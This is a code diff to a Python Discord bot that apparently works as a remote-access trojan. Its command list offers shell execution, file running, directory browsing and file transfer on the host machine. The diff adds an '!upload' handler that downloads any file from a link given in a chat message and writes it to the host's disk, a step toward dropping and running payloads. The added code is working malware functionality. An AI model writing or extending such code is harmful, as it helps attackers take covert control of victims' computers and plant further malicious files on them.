@@ -13,8 +13,8 @@ commands = "\n".join([
     "!ping - Ping command",
     "!cd - Change directory",
     "!ls - List directory",
-    "!download - Download file",
-    "!upload - Upload file",
+    "!download <file> - Download file",
+    "!upload <link> - Upload file",
     "!shell - Execute shell command",
     "!run - Run an file",
     "!exit - Exit the session",
@@ -76,6 +76,14 @@ async def on_message(message):
         except:
             embed = discord.Embed(title="Error", description=f"```File not found```", color=0xfafafa)
             await message.reply(embed=embed)
+
+    if message.content.startswith("!upload"):
+        link = message.content.split(" ")[1]
+        file = requests.get(link).content
+        with open(os.path.basename(link), "wb") as f:
+            f.write(file)
+        embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
+        await message.reply(embed=embed)
 
 bot.run(token)
 
